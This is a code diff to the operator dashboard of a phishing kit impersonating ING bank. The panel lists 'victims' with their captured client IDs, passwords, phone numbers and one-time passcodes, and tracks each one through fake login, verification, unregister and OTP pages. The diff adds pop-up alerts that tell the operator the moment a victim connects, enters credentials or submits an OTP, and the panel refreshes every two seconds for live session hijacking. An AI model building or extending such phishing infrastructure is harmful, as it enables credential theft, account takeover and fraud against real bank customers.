@@ -16,6 +16,8 @@
       --text-muted: #8b8b8b;
       --green: #34d399;
       --red: #fb7185;
+      --blue: #60a5fa;
+      --yellow: #fbbf24;
       --radius: 18px;
     }
     * { box-sizing: border-box; font-family: InterVariable, Inter, system-ui, sans-serif; }
@@ -63,9 +65,72 @@
     #modal .card { max-width: 500px; width: 90%; background: #111; border-color: #333; }
     #empty { text-align: center; color: #888; padding: 2rem 0; }
     @media (max-width: 900px) { .stats { grid-template-columns: 1fr; } }
+
+    /* Alert/Toast Styles */
+    #alert-container {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 10000;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      max-width: 400px;
+    }
+    .alert {
+      background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 12px;
+      padding: 16px 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      animation: slideIn 0.3s ease, fadeOut 0.3s ease 4.7s;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: transform 0.2s ease;
+    }
+    .alert:hover { transform: translateX(-5px); }
+    .alert-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      flex-shrink: 0;
+    }
+    .alert-content { flex: 1; }
+    .alert-title { font-size: 13px; font-weight: 600; color: var(--text-primary); margin-bottom: 2px; }
+    .alert-desc { font-size: 12px; color: var(--text-muted); }
+    .alert-time { font-size: 11px; color: var(--text-muted); margin-top: 4px; }
+    
+    .alert-success { border-left: 3px solid var(--green); }
+    .alert-success .alert-icon { background: rgba(52, 211, 153, 0.15); color: var(--green); }
+    
+    .alert-warning { border-left: 3px solid var(--yellow); }
+    .alert-warning .alert-icon { background: rgba(251, 191, 36, 0.15); color: var(--yellow); }
+    
+    .alert-info { border-left: 3px solid var(--blue); }
+    .alert-info .alert-icon { background: rgba(96, 165, 250, 0.15); color: var(--blue); }
+    
+    .alert-error { border-left: 3px solid var(--red); }
+    .alert-error .alert-icon { background: rgba(251, 113, 133, 0.15); color: var(--red); }
+
+    @keyframes slideIn {
+      from { transform: translateX(100%); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+    @keyframes fadeOut {
+      to { opacity: 0; transform: translateX(20px); }
+    }
   </style>
 </head>
 <body>
+  <div id="alert-container"></div>
+
   <div class="greet-bar">Hello, <span id="userName">admin</span>! • <span id="clock">--:-- --</span></div>
 
   <div class="dashboard">
@@ -103,6 +168,7 @@
   <script>
     let currentSid = null;
     const qs = s => document.querySelector(s);
+    let lastSessions = new Map();
 
     function updateClock(){
       const now = new Date();
@@ -123,14 +189,46 @@
       }
     }
 
+    /* ----------  ALERT SYSTEM  ---------- */
+    function showAlert(type, title, description, victimNum) {
+      const container = qs('#alert-container');
+      const alert = document.createElement('div');
+      alert.className = `alert alert-${type}`;
+      
+      const icons = {
+        success: '✓',
+        warning: '⚠',
+        info: 'ℹ',
+        error: '✕'
+      };
+      
+      const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+      
+      alert.innerHTML = `
+        <div class="alert-icon">${icons[type]}</div>
+        <div class="alert-content">
+          <div class="alert-title">${title}</div>
+          <div class="alert-desc">${description}</div>
+          <div class="alert-time">Victim #${victimNum} • ${time}</div>
+        </div>
+      `;
+      
+      alert.onclick = () => {
+        alert.remove();
+        // Optional: scroll to victim in table
+        const row = document.querySelector(`tr[data-sid="${victimNum}"]`);
+        if (row) row.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      };
+      
+      container.appendChild(alert);
+      setTimeout(() => alert.remove(), 5000);
+    }
+
     /* ----------  SESSION HEADER  ---------- */
     function getSessionHeader(v) {
       if (v.page === 'success') return `🦁 ING Login approved`;
       if (v.status === 'approved') return `🦁 ING Login approved`;
-
-      /*  NEW  ––  victim clicked “Confirm to Unregister”  */
       if (v.unregisterClicked) return `✅ Victim clicked unregister`;
-
       if (v.page === 'index.html') {
         return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
       } else if (v.page === 'verify.html') {
@@ -142,6 +240,45 @@
         return `🔑 Awaiting OTP...`;
       }
       return `🔑 Awaiting OTP...`;
+    }
+
+    /* ----------  CHECK FOR CHANGES & ALERT  ---------- */
+    function checkChanges(newSessions) {
+      newSessions.forEach(s => {
+        const old = lastSessions.get(s.sid);
+        if (!old) {
+          // New session started
+          showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
+          if (s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
+        } else {
+          // Check for changes
+          if (!old.entered && s.entered) {
+            showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
+          }
+          if (!old.phone && s.phone) {
+            showAlert('info', 'ENTERED PHONE', `Phone: ${s.phone}`, s.victimNum);
+          }
+          if (!old.unregisterClicked && s.unregisterClicked) {
+            showAlert('warning', 'CLICKED UNREGISTER', 'Victim proceeded to unregister', s.victimNum);
+          }
+          if (!old.otp && s.otp) {
+            showAlert('success', 'ENTERED OTP', `OTP: ${s.otp}`, s.victimNum);
+          }
+          if (old.page !== s.page) {
+            const pageNames = {
+              'index.html': 'Login Page',
+              'verify.html': 'Phone Verification',
+              'unregister.html': 'Unregister Page',
+              'otp.html': 'OTP Page',
+              'success': 'Success Page'
+            };
+            showAlert('info', 'PAGE CHANGE', `Moved to ${pageNames[s.page] || s.page}`, s.victimNum);
+          }
+        }
+      });
+      
+      // Update lastSessions
+      lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
     }
 
     function render(d){
@@ -158,7 +295,7 @@
       if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
       empty.style.display='none';
       body.innerHTML = d.sessions.map(s=>`
-        <tr>
+        <tr data-sid="${s.sid}">
           <td>${s.victimNum}</td>
           <td><span class="cred">${s.email||'—'}</span></td>
           <td><span class="cred">${s.password||'—'}</span></td>
@@ -206,6 +343,7 @@
     let jsonData = {};
     async function load(){
       jsonData = await fetch('/api/panel').then(r=>r.json());
+      checkChanges(jsonData.sessions);
       render(jsonData);
     }
     load(); setInterval(load,2000);
